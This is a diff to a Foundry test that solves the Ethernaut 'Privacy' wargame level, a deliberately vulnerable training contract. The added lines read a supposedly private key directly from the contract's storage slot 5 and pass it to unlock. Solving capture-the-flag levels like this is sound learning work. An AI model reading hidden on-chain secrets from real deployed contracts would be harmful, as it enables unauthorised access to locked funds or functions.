@@ -27,7 +27,8 @@ contract PrivacyTest is Test {
         /****************
          *    Attack     *
          *************** */
-
+        bytes32 data = vm.load(address(ethernautPrivacy),  bytes32(uint256(5)));
+        ethernautPrivacy.unlock(bytes16(data));
         /*****************
          *Level Submission*
          ***************  */
